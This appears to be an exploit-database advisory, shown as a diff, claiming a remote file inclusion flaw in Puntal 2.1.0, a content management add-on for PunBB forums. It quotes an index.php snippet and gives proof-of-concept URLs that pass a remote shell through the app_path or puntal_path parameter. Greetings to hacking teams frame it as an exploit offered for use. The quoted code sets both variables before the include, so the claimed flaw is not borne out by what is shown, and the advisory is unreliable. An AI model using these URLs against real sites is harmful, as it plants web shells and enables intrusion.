@@ -1,0 +1,92 @@
+====================================================
+Puntal 2.1.0 Remote File Inclusion Vulnerability
+====================================================
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : Inj3ct0r.com                                  0
+1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
+0                                                                      0
+1                    ########################################          1
+0                    I'm eidelweiss member from Inj3ct0r Team          1
+1                    ########################################          0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+Download:	http://sourceforge.net/projects/puntal/files/
+
+Author: 		idelweiss
+Contact:		eidelweiss[at]cyberservices.com
+Thank`s:		r0073r & 0x1D (inj3ct0r) , JosS , exploit-db team , [D]eal [C]yber
+Greetz:		all inj3ctor Team, yogyacarderlink Team, devilzc0de & all INDONESIAN HACKER`s
+
+========================================================================
+
+Description:
+
+Puntal is a free project under GNU/GPL Licence.
+Puntal is a LCMS (Light Content Management System) to the opposite of big and heavy CMS, Puntal is light and powerful.
+Puntal is a MOD of PunBB : which mean that you have to install PunBB first of all
+Puntal is a LCMS (Light Content Management System) for the famous PunBB forum software.
+Puntal will never changes anything in the core of PunBB, and is always in total respect of the W3C standard.
+What currently proposes Puntal :
+
+    * no modification of the files of PunBB is necessary to install Puntal;
+    * ten standard modules (news, download, calendar, articles, directory, planet, lexicon, bug traker, blog, search engine) ;
+    * the news module can use static (to be faster than query the database each time) or dynamic to display the data in real times ;
+    * a dozen of blocs to enable/disable to fit your needs ;
+    * a plugin system to add easyly blocs and modules and possibility to import/export easyly thoses plugins ;
+    * a Puntal control panel like the punBB one ;
+    * use of the style sheets of PunBB for a perfect integration between the portal and the forums ;
+    * multilanguage ;
+    * installation script ;
+    * and more ...
+	
+	
+copyright 2007 - http://www.puntal.fr
+
+========================================================================
+
+	-=[ VULN C0de ]=-
+
+[-] index.php
+
+************************************************************************/
+
+# APPLICATION PATH
+
+# Path to the root of the application (if you move this file)
+$app_path = '/';
+
+# If for example you put index.php at the root of your site and that Puntal
+# is in /puntal you can uncomment the following line: 
+
+// $app_path = '/puntal/';
+
+
+#------------------------------------------------------------------------
+# 			DO NOT CHANGE ANYTHING AFTER THIS LINE
+#------------------------------------------------------------------------
+
+$puntal_path = dirname(__FILE__).$app_path;
+
+require $puntal_path.'inc/public/prepend.php';
+
+
+========================================================================
+
+	-=[ P0C ]=-
+
+	http://127.0.0.1//path/index.php?app_path=[inj3ct0r sh3ll]
+			or
+	http://127.0.0.1//path/index.php?puntal_path=[inj3ct0r sh3ll]
+
+=========================| -=[ E0F ]=- |=================================
